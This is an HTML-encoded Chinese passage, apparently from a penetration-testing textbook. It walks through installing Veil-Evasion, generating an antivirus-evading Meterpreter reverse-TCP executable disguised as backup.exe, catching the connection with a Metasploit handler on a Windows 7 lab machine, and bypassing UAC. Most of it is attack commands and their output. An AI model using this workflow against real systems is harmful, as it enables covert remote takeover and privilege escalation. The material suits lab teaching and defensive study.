+<p>&#x56FE;6.36 &#x5B89;&#x88C5;&#x5B8C;&#x6210;</p>
+<p>&#x8BE5;&#x754C;&#x9762;&#x63D0;&#x793A;Python&#x5DF2;&#x7ECF;&#x5B89;&#x88C5;&#x5B8C;&#x6210;&#x3002;&#x6B64;&#x65F6;&#x5355;&#x51FB;Finish&#x6309;&#x94AE;&#xFF0C;&#x5C06;&#x663E;&#x793A;&#x5982;&#x56FE;6.37&#x6240;&#x793A;&#x7684;&#x754C;&#x9762;&#x3002;</p>
+<p><img src="img/00326.jpeg" alt="202-01"></p>
+<p>&#x56FE;6.37 &#x5B89;&#x88C5;pywin32-218&#x6A21;&#x5757;&#x754C;&#x9762;</p>
+<p>&#x8BE5;&#x754C;&#x9762;&#x662F;&#x8981;&#x6C42;&#x5B89;&#x88C5;pywin32-218&#x6A21;&#x5757;&#x3002;&#x8FD9;&#x91CC;&#x5355;&#x51FB;&#x201C;&#x4E0B;&#x4E00;&#x6B65;&#x201D;&#x6309;&#x94AE;&#xFF0C;&#x5C06;&#x663E;&#x793A;&#x5982;&#x56FE;6.38&#x6240;&#x793A;&#x7684;&#x754C;&#x9762;&#x3002;</p>
+<p><img src="img/00327.jpeg" alt="202-02"></p>
+<p>&#x56FE;6.38 &#x8BBE;&#x7F6E;&#x5411;&#x5BFC;</p>
+<p>&#x8FD9;&#x91CC;&#x4F7F;&#x7528;&#x9ED8;&#x8BA4;&#x8BBE;&#x7F6E;&#xFF0C;&#x5355;&#x51FB;&#x201C;&#x4E0B;&#x4E00;&#x6B65;&#x201D;&#x6309;&#x94AE;&#xFF0C;&#x5C06;&#x663E;&#x793A;&#x5982;&#x56FE;6.39&#x6240;&#x793A;&#x7684;&#x754C;&#x9762;&#x3002;</p>
+<p><img src="img/00328.jpeg" alt="202-03"></p>
+<p>&#x56FE;6.39 &#x51C6;&#x5907;&#x5B89;&#x88C5;</p>
+<p>&#x8BE5;&#x754C;&#x9762;&#x7528;&#x6765;&#x786E;&#x5B9E;&#x662F;&#x5426;&#x8981;&#x5F00;&#x59CB;&#x5B89;&#x88C5;&#x3002;&#x5982;&#x679C;&#x786E;&#x8BA4;&#x914D;&#x7F6E;&#x6B63;&#x786E;&#x7684;&#x8BDD;&#xFF0C;&#x5355;&#x51FB;&#x201C;&#x4E0B;&#x4E00;&#x6B65;&#x201D;&#x6309;&#x94AE;&#xFF0C;&#x5C06;&#x663E;&#x793A;&#x5982;&#x56FE;6.40&#x6240;&#x793A;&#x7684;&#x754C;&#x9762;&#x3002;</p>
+<p><img src="img/00329.jpeg" alt="203-01"></p>
+<p>&#x56FE;6.40 &#x5B89;&#x88C5;&#x5B8C;&#x6210;</p>
+<p>&#x4ECE;&#x8BE5;&#x754C;&#x9762;&#x53EF;&#x4EE5;&#x770B;&#x5230;pywin32-218&#x6A21;&#x5757;&#x5DF2;&#x7ECF;&#x5B89;&#x88C5;&#x5B8C;&#x6210;&#x3002;&#x6B64;&#x65F6;&#x5355;&#x51FB;&#x201C;&#x7ED3;&#x675F;&#x201D;&#x6309;&#x94AE;&#xFF0C;&#x5C06;&#x663E;&#x793A;&#x5982;&#x56FE;6.41&#x6240;&#x793A;&#x7684;&#x754C;&#x9762;&#x3002;</p>
+<p><img src="img/00330.jpeg" alt="203-02"></p>
+<p>&#x56FE;6.41 &#x5B89;&#x88C5;pycrypto-2.6&#x6A21;&#x5757;&#x521D;&#x59CB;&#x754C;&#x9762;</p>
+<p>&#x8BE5;&#x754C;&#x9762;&#x63D0;&#x793A;&#x9700;&#x8981;&#x5B89;&#x88C5;pycrypto-2.6&#x6A21;&#x5757;&#x3002;&#x8FD9;&#x91CC;&#x5355;&#x51FB;&#x201C;&#x4E0B;&#x4E00;&#x6B65;&#x201D;&#x6309;&#x94AE;&#x5F00;&#x59CB;&#x5B89;&#x88C5;&#xFF0C;&#x5982;&#x56FE;6.42&#x6240;&#x793A;&#x3002;</p>
+<p><img src="img/00331.jpeg" alt="203-03"></p>
+<p>&#x56FE;6.42 &#x8BBE;&#x7F6E;&#x5411;&#x5BFC;</p>
+<p>&#x8FD9;&#x91CC;&#x4F7F;&#x7528;&#x9ED8;&#x8BA4;&#x8BBE;&#x7F6E;&#xFF0C;&#x5355;&#x51FB;&#x201C;&#x4E0B;&#x4E00;&#x6B65;&#x201D;&#x6309;&#x94AE;&#xFF0C;&#x5C06;&#x663E;&#x793A;&#x5982;&#x56FE;6.43&#x6240;&#x793A;&#x7684;&#x754C;&#x9762;&#x3002;</p>
+<p><img src="img/00332.jpeg" alt="204-01"></p>
+<p>&#x56FE;6.43 &#x51C6;&#x5907;&#x5B89;&#x88C5;</p>
+<p>&#x8BE5;&#x754C;&#x9762;&#x63D0;&#x793A;&#x5C06;&#x8981;&#x5B89;&#x88C5;pycrypto&#x6A21;&#x5757;&#x3002;&#x8FD9;&#x91CC;&#x5355;&#x51FB;&#x201C;&#x4E0B;&#x4E00;&#x6B65;&#x201D;&#x6309;&#x94AE;&#xFF0C;&#x5C06;&#x663E;&#x793A;&#x5982;&#x56FE;6.44&#x6240;&#x793A;&#x7684;&#x754C;&#x9762;&#x3002;</p>
+<p><img src="img/00333.jpeg" alt="204-02"></p>
+<p>&#x56FE;6.44 &#x5B89;&#x88C5;&#x5B8C;&#x6210;</p>
+<p>&#x4ECE;&#x8BE5;&#x754C;&#x9762;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x4EE5;&#x4E0A;&#x8F6F;&#x4EF6;&#x5305;&#x5DF2;&#x5B89;&#x88C5;&#x5B8C;&#x6210;&#x3002;&#x6B64;&#x65F6;&#x5355;&#x51FB;&#x201C;&#x7ED3;&#x675F;&#x201D;&#x6309;&#x94AE;&#xFF0C;&#x5C06;&#x663E;&#x793A;&#x5982;&#x4E0B;&#x6240;&#x793A;&#x7684;&#x4FE1;&#x606F;&#xFF1A;</p>
+<pre><code>===============================================
+ Veil-Evasion | [Version]: 2.4.3
+===============================================
+ [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
+===============================================
+Main Menu
+  24 payloads loaded
+Available commands:
+  use      use a specific payload
+  info     information on a specific payload
+  list     list available payloads
+  update   update Veil to the latest version
+  clean    clean out payload folders
+  checkvt  check payload hashes vs. VirusTotal
+  exit     exit Veil
+[&gt;] Please enter a command:
+</code></pre><p>&#x4ECE;&#x4EE5;&#x4E0A;&#x4FE1;&#x606F;&#x4E2D;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5728;Veil&#x4E0B;&#xFF0C;&#x6709;24&#x4E2A;&#x653B;&#x51FB;&#x8F7D;&#x8377;&#x53EF;&#x52A0;&#x8F7D;&#xFF0C;&#x5E76;&#x5217;&#x51FA;&#x4E86;&#x53EF;&#x7528;&#x7684;&#x547D;&#x4EE4;&#x3002;&#x73B0;&#x5728;&#x5C31;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x5404;&#x79CD;&#x64CD;&#x4F5C;&#x4E86;&#x3002;&#x4F8B;&#x5982;&#x67E5;&#x770B;&#x53EF;&#x52A0;&#x8F7D;&#x7684;&#x653B;&#x51FB;&#x6A21;&#x5757;&#xFF0C;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;</p>
+<pre><code>[&gt;] Please enter a command: list
+===============================================
+ Veil-Evasion | [Version]: 2.4.3
+===============================================
+ [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
+===============================================
+[*] Available payloads:
+  1)   c/meterpreter/rev_tcp
+  2)   c/meterpreter/rev_tcp_service
+  3)   c/shellcode_inject/virtual
+  4)   c/shellcode_inject/void
+  5)   cs/meterpreter/rev_tcp
+  6)   cs/shellcode_inject/base64_substitution
+  7)   cs/shellcode_inject/virtual
+  8)   native/Hyperion
+  9)   native/backdoor_factory
+  10)  native/pe_scrambler
+  11)  powershell/shellcode_inject/download_virtual
+  12)  powershell/shellcode_inject/psexec_virtual
+  13)  powershell/shellcode_inject/virtual
+  14)  python/meterpreter/rev_http
+  15)  python/meterpreter/rev_http_contained
+  16)  python/meterpreter/rev_https
+  17)  python/meterpreter/rev_https_contained
+  18)  python/meterpreter/rev_tcp
+  19)  python/shellcode_inject/aes_encrypt
+  20)  python/shellcode_inject/arc_encrypt
+  21)  python/shellcode_inject/base64_substitution
+  22)  python/shellcode_inject/des_encrypt
+  23)  python/shellcode_inject/flat
+  24)  python/shellcode_inject/letter_substitution
+</code></pre><p>&#x4ECE;&#x8F93;&#x51FA;&#x7684;&#x4FE1;&#x606F;&#x4E2D;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6709;24&#x4E2A;&#x53EF;&#x7528;&#x7684;&#x653B;&#x51FB;&#x8F7D;&#x8377;&#x3002;&#x6B64;&#x65F6;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x4EFB;&#x4F55;&#x4E00;&#x4E2A;&#x653B;&#x51FB;&#x8F7D;&#x8377;&#xFF0C;&#x8FDB;&#x884C;&#x6E17;&#x900F;&#x653B;&#x51FB;&#x3002;</p>
+<p>&#x3010;&#x5B9E;&#x4F8B;6-5&#x3011;&#x6F14;&#x793A;&#x4F7F;&#x7528;Veil&#x5DE5;&#x5177;&#x4E2D;&#x7684;&#x8F7D;&#x8377;&#xFF08;&#x672C;&#x4F8B;&#x4EE5;cs/meterpreter/rev_tcp&#x4E3A;&#x4F8B;&#xFF09;&#xFF0C;&#x8FDB;&#x884C;&#x6E17;&#x900F;&#x653B;&#x51FB;&#xFF08;&#x8FD9;&#x91CC;&#x4EE5;Windows 7&#x4F5C;&#x4E3A;&#x653B;&#x51FB;&#x9776;&#x673A;&#xFF09;&#x3002;&#x5177;&#x4F53;&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;&#x5982;&#x4E0B;&#x6240;&#x793A;&#x3002;</p>
+<p>&#xFF08;1&#xFF09;&#x542F;&#x52A8;Veil&#x5DE5;&#x5177;&#x3002;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;</p>
+<pre><code>root@kali:~# veil-evasion
+</code></pre><p>&#x6267;&#x884C;&#x4EE5;&#x4E0A;&#x547D;&#x4EE4;&#x540E;&#xFF0C;&#x5C06;&#x663E;&#x793A;&#x5982;&#x4E0B;&#x6240;&#x793A;&#x7684;&#x4FE1;&#x606F;&#xFF1A;</p>
+<pre><code>===============================================
+ Veil-Evasion | [Version]: 2.4.3
+===============================================
+ [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
+===============================================
+Main Menu
+  24 payloads loaded
+Available commands:
+  use      use a specific payload
+  info     information on a specific payload
+  list     list available payloads
+  update   update Veil to the latest version
+  clean    clean out payload folders
+  checkvt  check payload hashes vs. VirusTotal
+  exit     exit Veil
+[&gt;] Please enter a command:
+</code></pre><p>&#x5728;&#x8F93;&#x51FA;&#x7684;&#x4FE1;&#x606F;&#x4E2D;&#x770B;&#x5230;[&gt;] Please enter a command:&#x63D0;&#x793A;&#x7B26;&#xFF0C;&#x5C31;&#x8868;&#x793A;Veil&#x767B;&#x5F55;&#x6210;&#x529F;&#x4E86;&#x3002;</p>
+<p>&#xFF08;2&#xFF09;&#x9009;&#x62E9;cs/meterpreter/rev_tcp&#x653B;&#x51FB;&#x8F7D;&#x8377;&#x3002;&#x5728;&#x653B;&#x51FB;&#x8F7D;&#x8377;&#x5217;&#x8868;&#x4E2D;&#xFF0C;cs/meterpreter/rev_tcp&#x8F7D;&#x8377;&#x7684;&#x7F16;&#x53F7;&#x662F;5&#x3002;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;</p>
+<pre><code>[&gt;] Please enter a command: use 5
+===============================================
+ Veil-Evasion | [Version]: 2.4.3
+===============================================
+ [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
+===============================================
+Payload: cs/meterpreter/rev_tcp loaded
+Required Options:
+Name            Current Value   Description
+ ----           -------------   --------------------------
+ LHOST                          IP of the metasploit handler
+ LPORT          4444            Port of the metasploit handler
+ compile_to_exe Y               Compile to an executable
+Available commands:
+  set       set a specific option value
+  info      show information about the payload
+  generate  generate payload
+  back      go to the main menu
+  exit      exit Veil
+ [&gt;] Please enter a command:
+</code></pre><p>&#x8F93;&#x51FA;&#x4FE1;&#x606F;&#x663E;&#x793A;&#x4E86;rev_tcp&#x653B;&#x51FB;&#x8F7D;&#x8377;&#x53EF;&#x914D;&#x7F6E;&#x7684;&#x9009;&#x9879;&#x53C2;&#x6570;&#x3002;&#x8FD9;&#x91CC;&#x9ED8;&#x8BA4;&#x6307;&#x5B9A;&#x7684;&#x672C;&#x5730;&#x7AEF;&#x53E3;&#xFF08;LPORT&#xFF09;&#x662F;4444&#xFF0C;LHOST&#x9009;&#x9879;&#x8FD8;&#x6CA1;&#x6709;&#x914D;&#x7F6E;&#x3002;</p>
+<p>&#xFF08;3&#xFF09;&#x914D;&#x7F6E;LHOST&#x9009;&#x9879;&#x53C2;&#x6570;&#xFF0C;&#x5E76;&#x67E5;&#x770B;&#x653B;&#x51FB;&#x8F7D;&#x8377;&#x7684;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;&#x3002;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;</p>
+<pre><code>[&gt;] Please enter a command: set LHOST 192.168.6.103
+[&gt;] Please enter a command: info
+===============================================
+ Veil-Evasion | [Version]: 2.4.3
+===============================================
+ [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
+===============================================
+Payload information:
+  Name:         cs/meterpreter/rev_tcp
+  Language:     cs
+  Rating:       Excellent
+  Description:  pure windows/meterpreter/reverse_tcp stager, no shellcode
+Required Options:
+Name             Current Value  Description
+ ----            ------------- --------------------------
+ LHOST           192.168.6.100  IP of the metasploit handler
+ LPORT           4444           Port of the metasploit handler
+ compile_to_exe  Y              Compile to an executable
+</code></pre><p>&#x4ECE;&#x8F93;&#x51FA;&#x7684;&#x4FE1;&#x606F;&#x4E2D;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;rev_tcp&#x653B;&#x51FB;&#x8F7D;&#x8377;&#x7684;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;&#xFF0C;&#x5982;&#x653B;&#x51FB;&#x8F7D;&#x8377;&#x540D;&#x3001;&#x8BED;&#x8A00;&#x3001;&#x7EA7;&#x522B;&#x53CA;&#x914D;&#x7F6E;&#x7684;&#x9009;&#x9879;&#x53C2;&#x6570;&#x7B49;&#x3002;</p>
+<p>&#xFF08;4&#xFF09;&#x6B64;&#x65F6;&#xFF0C;&#x4F7F;&#x7528;generate&#x547D;&#x4EE4;&#x751F;&#x6210;&#x8F7D;&#x8377;&#x6587;&#x4EF6;&#x3002;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;</p>
+<pre><code>[&gt;] Please enter a command: generate
+===============================================
+ Veil-Evasion | [Version]: 2.4.3
+===============================================
+ [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
+===============================================
+[*] Press [enter] for &apos;payload&apos;
+ [&gt;] Please enter the base name for output files: backup  #&#x6307;&#x5B9A;&#x8F93;&#x51FA;&#x6587;&#x4EF6;&#x540D;
+</code></pre><p>&#x5728;&#x4EE5;&#x4E0A;&#x547D;&#x4EE4;&#x4E2D;&#x6307;&#x5B9A;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x540D;&#x4E3A;backup&#x3002;&#x7136;&#x540E;&#x6309;&#x4E0B;&#x56DE;&#x8F66;&#x952E;&#xFF0C;&#x5C06;&#x663E;&#x793A;&#x5982;&#x4E0B;&#x6240;&#x793A;&#x7684;&#x4FE1;&#x606F;&#xFF1A;</p>
+<pre><code> [*] Executable written to: /root/veil-output/compiled/backup.exe
+Language:            cs
+ Payload:            cs/meterpreter/rev_tcp
+ Required Options:   LHOST=192.168.6.103 LPORT=4444 compile_to_exe=Y
+ Payload File:       /root/veil-output/source/backup.cs
+ Handler File:       /root/veil-output/handlers/backup_handler.rc
+[*] Your payload files have been generated, don&apos;t get caught!
+ [!] And don&apos;t submit samples to any online scanner! ;)
+[&gt;] press any key to return to the main menu:
+</code></pre><p>&#x4ECE;&#x8F93;&#x51FA;&#x7684;&#x4FE1;&#x606F;&#x4E2D;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x751F;&#x6210;&#x4E00;&#x4E2A;&#x53EF;&#x6267;&#x884C;&#x6587;&#x4EF6;backup.exe&#xFF0C;&#x5E76;&#x4E14;&#x8BE5;&#x6587;&#x4EF6;&#x4FDD;&#x5B58;&#x5728;/root/veil-output/compiled/&#x4E2D;&#x3002;&#x6B64;&#x65F6;&#x5C06;&#x53EF;&#x6267;&#x884C;&#x6587;&#x4EF6;backup.exe&#x53D1;&#x9001;&#x5230;&#x76EE;&#x6807;&#x4E3B;&#x673A;&#x4E0A;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8BE5;&#x653B;&#x51FB;&#x8F7D;&#x8377;&#x4E86;&#x3002;</p>
+<p>&#x63A5;&#x4E0B;&#x6765;&#x9700;&#x8981;&#x4F7F;&#x7528;Metasploit&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x8FDC;&#x7A0B;&#x5904;&#x7406;&#x5668;&#xFF0C;&#x7B49;&#x5F85;&#x76EE;&#x6807;&#x4E3B;&#x673A;&#x8FDE;&#x63A5;&#x5230;Kali Linux&#xFF08;&#x653B;&#x51FB;&#x4E3B;&#x673A;&#xFF09;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x3002;&#x8FDE;&#x63A5;&#x6210;&#x529F;&#x540E;&#xFF0C;&#x5C31;&#x83B7;&#x53D6;&#x5230;&#x4E00;&#x4E2A;&#x8FDC;&#x7A0B;Shell&#x547D;&#x4EE4;&#x3002;</p>
+<p>&#x3010;&#x5B9E;&#x4F8B;6-6&#x3011;&#x521B;&#x5EFA;&#x8FDC;&#x7A0B;&#x5904;&#x7406;&#x5668;&#x3002;&#x5177;&#x4F53;&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;&#x5982;&#x4E0B;&#x6240;&#x793A;&#x3002;</p>
+<p>&#xFF08;1&#xFF09;&#x542F;&#x52A8;MSF&#x7EC8;&#x7AEF;&#x3002;</p>
+<p>&#xFF08;2&#xFF09;&#x4F7F;&#x7528;handler&#x6A21;&#x5757;&#x3002;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;</p>
+<pre><code>msf &gt; use exploit/multi/handler
+</code></pre><p>&#xFF08;3&#xFF09;&#x52A0;&#x8F7D;reverse_tcp&#x653B;&#x51FB;&#x8F7D;&#x8377;&#xFF0C;&#x5E76;&#x8BBE;&#x7F6E;&#x5176;&#x9009;&#x9879;&#x53C2;&#x6570;&#x3002;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;</p>
+<pre><code>msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp
+payload =&gt; windows/meterpreter/reverse_tcp
+msf exploit(handler) &gt; set LHOST 192.168.6.103
+LHOST =&gt; 192.168.6.103
+</code></pre><p>&#xFF08;4&#xFF09;&#x542F;&#x52A8;&#x6E17;&#x900F;&#x653B;&#x51FB;&#x3002;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;</p>
+<pre><code>msf exploit(handler) &gt; exploit
+[*] Started reverse handler on 192.168.6.103:4444
+[*] Starting the payload handler&#x2026;
+</code></pre><p>&#x4ECE;&#x8F93;&#x51FA;&#x4FE1;&#x606F;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x653B;&#x51FB;&#x8F7D;&#x8377;&#x5DF2;&#x542F;&#x52A8;&#xFF0C;&#x6B63;&#x5728;&#x7B49;&#x5F85;&#x8FDE;&#x63A5;&#x76EE;&#x6807;&#x4E3B;&#x673A;&#x3002;</p>
+<p>&#x6B64;&#x65F6;&#x5C06;&#x524D;&#x9762;&#x751F;&#x6210;&#x7684;&#x53EF;&#x6267;&#x884C;&#x6587;&#x4EF6;backup.exe&#x53D1;&#x9001;&#x5230;&#x76EE;&#x6807;&#x4E3B;&#x673A;&#xFF08;Windows 7&#xFF09;&#xFF0C;&#x5E76;&#x8FD0;&#x884C;&#x8BE5;&#x53EF;&#x6267;&#x884C;&#x6587;&#x4EF6;&#x3002;&#x7136;&#x540E;&#x8FD4;&#x56DE;&#x5230;Kali Linux&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#xFF0C;&#x5C06;&#x770B;&#x5230;&#x5982;&#x4E0B;&#x6240;&#x793A;&#x7684;&#x4FE1;&#x606F;&#xFF1A;</p>
+<pre><code>[*] Sending stage (769536 bytes) to 192.168.6.110
+[*] Meterpreter session 1 opened (192.168.6.103:4444 -&gt; 192.168.6.110:2478) at 2014-07-17 10:44:47 +0800
+meterpreter &gt;
+</code></pre><p>&#x4ECE;&#x4EE5;&#x4E0A;&#x4FE1;&#x606F;&#x4E2D;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6210;&#x529F;&#x6253;&#x5F00;&#x4E86;&#x4E00;&#x4E2A;Meterpreter&#x4F1A;&#x8BDD;&#x3002;&#x8FD9;&#x8868;&#x793A;&#x5DF2;&#x6210;&#x529F;&#x6E17;&#x900F;&#x653B;&#x51FB;&#x76EE;&#x6807;&#x4E3B;&#x673A;&#xFF0C;&#x73B0;&#x5728;&#x5C31;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x4E00;&#x4E9B;Shell&#x547D;&#x4EE4;&#x3002;&#x5982;&#x8FDB;&#x884C;&#x76EE;&#x6807;&#x4E3B;&#x673A;&#x7684;Shell&#x73AF;&#x5883;&#xFF0C;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x5982;&#x4E0B; &#x6240;&#x793A;&#xFF1A;</p>
+<pre><code>meterpreter &gt; shell
+Process 1544 created.
+Channel 1 created.
+Microsoft Windows [&#x7248;&#x672C; 6.1.7601]
+              (c) 2009 Microsoft Corporation
+C:\Users\lyw\Desktop&gt;
+</code></pre><p>&#x8F93;&#x51FA;&#x7684;&#x4FE1;&#x606F;&#x8868;&#x793A;&#x8FDB;&#x5165;&#x4E86;&#x76EE;&#x6807;&#x7CFB;&#x7EDF;Windows 7&#x7684;&#x547D;&#x4EE4;&#x884C;&#xFF0C;&#x5E76;&#x4E14;&#x5F53;&#x524D;&#x76EE;&#x6807;&#x7CFB;&#x7EDF;&#x767B;&#x5F55;&#x7684;&#x7528;&#x6237;&#x662F;lyw&#x3002;</p>
+<p>&#x5982;&#x679C;&#x4EE5;&#x4E0A;&#x7528;&#x6237;&#x6CA1;&#x6709;&#x592A;&#x9AD8;&#x6743;&#x9650;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;Metasploit&#x4E2D;&#x7684;bypassuac&#x6A21;&#x5757;&#x7ED5;&#x8FC7;UAC&#xFF08;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x63A7;&#x5236;&#xFF09;&#xFF0C;&#x8FDB;&#x800C;&#x63D0;&#x5347;&#x7528;&#x6237;&#x7684;&#x6743;&#x9650;&#x3002;&#x4E0B;&#x9762;&#x5C06;&#x4ECB;&#x7ECD;&#x4F7F;&#x7528;bypassuac&#x6A21;&#x5757;&#x63D0;&#x5347;&#x4EE5;&#x4E0A;lyw&#x7528;&#x6237;&#x7684;&#x6743;&#x9650;&#x3002;</p>
+<p>&#xFF08;1&#xFF09;&#x5C06;Meterpreter&#x4F1A;&#x8BDD;&#xFF0C;&#x8C03;&#x7528;&#x5230;&#x540E;&#x53F0;&#x8FD0;&#x884C;&#x3002;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;</p>
+<pre><code>meterpreter &gt; background
+[*] Backgrounding session 1&#x2026;
+</code></pre><p>&#x4ECE;&#x8F93;&#x51FA;&#x7684;&#x4FE1;&#x606F;&#x4E2D;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5F53;&#x524D;&#x540E;&#x53F0;&#x8FD0;&#x884C;&#x7684;&#x4F1A;&#x8BDD;&#x7F16;&#x53F7;&#x662F;1&#x3002;&#x8BE5;&#x4F1A;&#x8BDD;&#x7F16;&#x53F7;&#x9700;&#x8981;&#x8BB0;&#x4F4F;&#xFF0C;&#x5728;&#x540E;&#x9762;&#x5C06;&#x4F1A;&#x7528;&#x5230;&#x3002;</p>
+<p>&#xFF08;2&#xFF09;&#x67E5;&#x770B;&#x4F1A;&#x8BDD;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;&#x3002;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;</p>
+<p><img src="img/00334.jpeg" alt="208-01"></p>
+<p>&#x4ECE;&#x8F93;&#x51FA;&#x4FE1;&#x606F;&#x4E2D;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x8BE5;&#x4F1A;&#x8BDD;&#x4E2D;&#xFF0C;&#x8FDE;&#x63A5;&#x5230;&#x76EE;&#x6807;&#x7CFB;&#x7EDF;&#x7684;&#x8FD0;&#x884C;&#x67B6;&#x6784;&#x3001;&#x8BA1;&#x7B97;&#x673A;&#x540D;&#x53CA;IP&#x5730;&#x5740;&#x3002;</p>
+<p>&#xFF08;3&#xFF09;&#x4F7F;&#x7528;bypassuac&#x6A21;&#x5757;&#xFF0C;&#x5E76;&#x67E5;&#x770B;&#x53EF;&#x914D;&#x7F6E;&#x7684;&#x9009;&#x9879;&#x53C2;&#x6570;&#x3002;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;</p>
+<p><img src="img/00335.jpeg" alt="208-02"></p>
+<p>&#x4ECE;&#x8F93;&#x51FA;&#x4FE1;&#x606F;&#x4E2D;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6A21;&#x5757;&#x9009;&#x9879;&#x4E2D;&#x6709;&#x4E00;&#x4E2A;&#x53EF;&#x914D;&#x7F6E;&#x7684;&#x9009;&#x9879;&#x53C2;&#x6570;SESSION&#x3002;&#x8BE5;&#x9009;&#x9879;&#x7684;&#x503C;&#xFF0C;&#x5C31;&#x662F;&#x5F53;&#x524D;&#x540E;&#x53F0;&#x8FD0;&#x884C;&#x7684;&#x4F1A;&#x8BDD;&#x7F16;&#x53F7;&#x3002;</p>
+<p>&#xFF08;4&#xFF09;&#x8BBE;&#x7F6E;SESSION&#x9009;&#x9879;&#x53C2;&#x6570;&#x3002;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;</p>
+<pre><code>msf exploit(bypassuac) &gt; set session 1
+session =&gt; 1
+</code></pre><p>&#xFF08;5&#xFF09;&#x542F;&#x52A8;&#x6E17;&#x900F;&#x653B;&#x51FB;&#x3002;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;</p>
+<pre><code>msf exploit(bypassuac) &gt; exploit
+[*] Started reverse handler on 192.168.6.103:4444
+[*] UAC is Enabled, checking level&#x2026;
+[+] UAC is set to Default
+[+] BypassUAC can bypass this setting, continuing&#x2026;
+[+] Part of Administrators group! Continuing&#x2026;
+[*] Uploaded the agent to the filesystem&#x2026;.
+[*] Uploading the bypass UAC executable to the filesystem&#x2026;
+[*] Meterpreter stager executable 73802 bytes long being uploaded..
+[*] Sending stage (769536 bytes) to 192.168.6.106
+[*] Meterpreter session 2 opened (192.168.6.103:4444 -&gt; 192.168.6.106:49206) at 2014-07-18 10:15:38 +0800
+meterpreter &gt;
+</code></pre><p>&#x4ECE;&#x8F93;&#x51FA;&#x7684;&#x4FE1;&#x606F;&#x4E2D;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x76EE;&#x524D;&#x767B;&#x5F55;&#x7684;&#x7528;&#x6237;&#x5B9E;&#x9645;&#x4E0A;&#x662F;&#x5C5E;&#x4E8E;&#x7BA1;&#x7406;&#x7EC4;&#x7684;&#x6210;&#x5458;&#xFF0C;&#x5E76;&#x4E14;&#x7ED5;&#x8FC7;&#x4E86;UAC&#x521B;&#x5EFA;&#x4E86;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x4F1A;&#x8BDD;&#x3002;&#x6B64;&#x65F6;&#x5C31;&#x53EF;&#x4EE5;&#x63D0;&#x5347;&#x7528;&#x6237;&#x7684;&#x6743;&#x9650;&#x4E86;&#x3002;</p>
+<p>&#xFF08;6&#xFF09;&#x67E5;&#x770B;lyw&#x7528;&#x6237;&#x7684;&#x4FE1;&#x606F;&#x3002;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;</p>
+<pre><code>meterpreter &gt; getuid
+Server username: WIN-RKPKQFBLG6C\lyw
+</code></pre><p>&#x4ECE;&#x8F93;&#x51FA;&#x4FE1;&#x606F;&#x4E2D;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x8BE5;&#x7528;&#x6237;&#x53EA;&#x662F;WIN-RKPKQFBLG6C&#x8BA1;&#x7B97;&#x673A;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x666E;&#x901A;&#x7528;&#x6237;&#x3002;</p>
